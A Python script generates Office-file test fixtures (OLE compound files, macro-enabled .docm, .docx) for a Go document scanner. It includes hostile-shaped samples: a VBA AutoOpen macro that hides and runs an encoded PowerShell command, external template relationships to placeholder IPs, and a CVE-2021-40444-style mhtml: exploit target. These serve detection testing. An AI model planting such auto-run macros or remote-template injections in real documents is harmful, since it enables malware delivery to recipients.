#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only
#
# Builds the Office documents the Go tests read.
#
# Committed as a generator rather than only as binaries so the fixtures can be
# inspected and changed, and because a checked-in blob nobody can regenerate is a
# fixture nobody dares touch.
#
# Every compound file it writes is verified with olefile before being saved: the Go
# reader is a reimplementation, and testing it against fixtures built by the same
# understanding would only prove the two agree. olefile is the reference.
#
#   python3 generate.py

import io, os, struct, sys, zipfile

SECTOR = 512
FREE, ENDOFCHAIN, FATSECT = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD
MINI_CUTOFF = 4096

def _entry(name, typ, start, size, left=FREE, right=FREE, child=FREE):
    n = name.encode("utf-16-le") + b"\x00\x00"
    e = n.ljust(64, b"\x00")
    e += struct.pack("<H", len(n))
    e += struct.pack("<BB", typ, 1)             # type, colour (black)
    e += struct.pack("<III", left, right, child)
    e += b"\x00" * 16                            # CLSID
    e += struct.pack("<I", 0)                    # state bits
    e += b"\x00" * 16                            # timestamps
    e += struct.pack("<I", start)
    e += struct.pack("<Q", size)
    assert len(e) == 128, len(e)
    return e

def build_cfb(streams):
    """streams: list of (name, bytes). Returns compound file bytes.

    Small streams go in the mini stream, as real VBA modules do — that path is
    where a naive reader fails, so the fixtures must exercise it."""
    big  = [(n, d) for n, d in streams if len(d) >= MINI_CUTOFF]
    mini = [(n, d) for n, d in streams if len(d) < MINI_CUTOFF]

    # Lay out the mini stream first; it becomes the root entry's own stream.
    mini_data, mini_locs = b"", {}
    for n, d in mini:
        mini_locs[n] = len(mini_data) // 64
        mini_data += d + b"\x00" * (-len(d) % 64)

    # Sector plan: 0 = FAT, 1 = directory, 2 = miniFAT, then data.
    sectors, fat = [], {}
    def add(data, first_sector):
        """Append data as sectors and chain them in the FAT."""
        chunks = [data[i:i+SECTOR].ljust(SECTOR, b"\x00") for i in range(0, max(len(data), 1), SECTOR)]
        for i, c in enumerate(chunks):
            s = first_sector + i
            sectors.append(c)
            fat[s] = s + 1 if i < len(chunks) - 1 else ENDOFCHAIN
        return len(chunks)

    # miniFAT: one entry per 64-byte mini sector, chained per stream.
    minifat = []
    for n, d in mini:
        count = max(1, (len(d) + 63) // 64)
        base = mini_locs[n]
        for i in range(count):
            minifat.append(base + i + 1 if i < count - 1 else ENDOFCHAIN)
    minifat_bytes = b"".join(struct.pack("<I", v) for v in minifat).ljust(SECTOR, b"\xff")

    next_sector = 3
    big_locs = {}
    for n, d in big:
        big_locs[n] = next_sector
        next_sector += add(d, next_sector)
    mini_start = next_sector
    if mini_data:
        next_sector += add(mini_data, next_sector)

    # Directory: root, then every stream, linked as a degenerate tree.
    #
    # The sibling links are load-bearing and easy to omit. olefile walks the
    # red-black tree through child/left/right and stops at the first entry with no
    # siblings, so a directory that merely lists the streams in order shows only
    # one of them. A reader that scans the array instead — as the Go one does —
    # sees them all and never notices the fixture is malformed. Linking them here
    # is what makes olefile a real check rather than a rubber stamp.
    entries = [_entry("Root Entry", 5, mini_start if mini_data else FREE, len(mini_data),
                      child=1 if streams else FREE)]
    for i, (n, d) in enumerate(streams):
        start = big_locs.get(n, mini_locs.get(n, FREE))
        right = i + 2 if i < len(streams) - 1 else FREE
        entries.append(_entry(n, 2, start, len(d), right=right))
    dir_bytes = b"".join(entries).ljust(SECTOR, b"\x00")

    fat[0], fat[1], fat[2] = FATSECT, ENDOFCHAIN, ENDOFCHAIN
    fat_bytes = b"".join(struct.pack("<I", fat.get(i, FREE))
                         for i in range(max(SECTOR // 4, next_sector)))[:SECTOR]
    fat_bytes = fat_bytes.ljust(SECTOR, b"\xff")

    header = bytearray(b"\x00" * SECTOR)
    header[0:8]   = bytes([0xD0,0xCF,0x11,0xE0,0xA1,0xB1,0x1A,0xE1])
    header[24:26] = struct.pack("<H", 0x003E)   # minor version
    header[26:28] = struct.pack("<H", 0x0003)   # major version 3 => 512-byte sectors
    header[28:30] = struct.pack("<H", 0xFFFE)   # little endian
    header[30:32] = struct.pack("<H", 9)        # sector shift
    header[32:34] = struct.pack("<H", 6)        # mini sector shift
    header[44:48] = struct.pack("<I", 1)        # FAT sector count
    header[48:52] = struct.pack("<I", 1)        # first directory sector
    header[56:60] = struct.pack("<I", MINI_CUTOFF)
    header[60:64] = struct.pack("<I", 2)        # first miniFAT sector
    header[64:68] = struct.pack("<I", 1)        # miniFAT sector count
    header[68:72] = struct.pack("<I", ENDOFCHAIN)
    header[76:80] = struct.pack("<I", 0)        # DIFAT[0] = FAT at sector 0
    for i in range(1, 109):
        header[76+i*4:80+i*4] = struct.pack("<I", FREE)

    # Sectors 0, 1 and 2 are the FAT, the directory and the miniFAT; `sectors`
    # holds only the data that add() appended, starting at sector 3.
    body = [fat_bytes, dir_bytes, minifat_bytes] + sectors
    return bytes(header) + b"".join(body)

def compress_ovba(data):
    """MS-OVBA container using literal tokens only.

    Valid output: a decompressor that handles literals and chunk headers reads it
    back exactly. Not an efficient compressor — it is a fixture builder."""
    out = bytearray(b"\x01")
    for i in range(0, len(data), 4096):
        chunk = data[i:i+4096]
        body = bytearray()
        for j in range(0, len(chunk), 8):
            group = chunk[j:j+8]
            body.append(0x00)              # all eight are literals
            body += group
        header = 0x8000 | 0x3000 | ((len(body) - 3) & 0x0FFF)
        out += struct.pack("<H", header) + body
    return bytes(out)

VBA_AUTOEXEC = b'''Attribute VB_Name = "Module1"
Sub AutoOpen()
    Dim p As String
    p = "power" & "shell -enc SQBFAFgA"
    Shell p, vbHide
End Sub
'''
VBA_BENIGN = b'''Attribute VB_Name = "Module1"
Sub FormatTable()
    Selection.Tables(1).Rows.Alignment = wdAlignRowCenter
End Sub
'''

def docx_with_relationship(target, mode="External"):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
        z.writestr("_rels/.rels",
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
                   '</Relationships>')
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/_rels/settings.xml.rels",
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   f'<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target}" TargetMode="{mode}"/>'
                   '</Relationships>')
    return buf.getvalue()

def docm_with_macro(vba):
    project = build_cfb([("dir", b"\x00" * 64), ("Module1", compress_ovba(vba))])
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types/>')
        z.writestr("_rels/.rels", '<?xml version="1.0"?><Relationships/>')
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", project)
    return buf.getvalue()

def verify_cfb(data, expect_streams):
    import olefile
    assert olefile.isOleFile(io.BytesIO(data)), "olefile does not recognise this as a compound file"
    ole = olefile.OleFileIO(io.BytesIO(data))
    names = {"/".join(p) for p in ole.listdir()}
    for s in expect_streams:
        assert s in names, f"olefile cannot see stream {s!r}; it sees {names}"
        got = ole.openstream(s).read()
        assert got, f"olefile read {s!r} as empty"
    ole.close()
    return True

def main():
    here = os.path.dirname(os.path.abspath(__file__))
    macro_project = build_cfb([("dir", b"\x00" * 64), ("Module1", compress_ovba(VBA_AUTOEXEC))])
    verify_cfb(macro_project, ["Module1", "dir"])

    benign_project = build_cfb([("dir", b"\x00" * 64), ("Module1", compress_ovba(VBA_BENIGN))])
    verify_cfb(benign_project, ["Module1"])

    encrypted = build_cfb([("EncryptedPackage", b"\x00" * 8192),
                           ("EncryptionInfo", b"\x04\x00\x04\x00")])
    verify_cfb(encrypted, ["EncryptedPackage"])

    files = {
        "macro_project.bin":        macro_project,
        "benign_project.bin":       benign_project,
        "encrypted.doc":            encrypted,
        "remote_template.docx":     docx_with_relationship("http://198.51.100.9/t.dotm"),
        "file_scheme.docx":         docx_with_relationship("file://203.0.113.5/share/x.dotm"),
        # The CVE-2021-40444 shape: an mhtml: target that loads a scriptlet through
        # MSHTML. The corpus rule matches on "html:http" appearing in the target.
        "cve_2021_40444.docx":      docx_with_relationship(
            "mhtml:http://198.51.100.9/exploit.html!x-usc:http://198.51.100.9/exploit.html"),
        "internal_only.docx":       docx_with_relationship("styles.xml", mode="Internal"),
        "macro.docm":               docm_with_macro(VBA_AUTOEXEC),
        "benign_macro.docm":        docm_with_macro(VBA_BENIGN),
    }
    for name, data in files.items():
        with open(os.path.join(here, name), "wb") as f:
            f.write(data)
        print(f"{name:28} {len(data):>8,} bytes")
    print("all compound files verified against olefile")

if __name__ == "__main__":
    main()
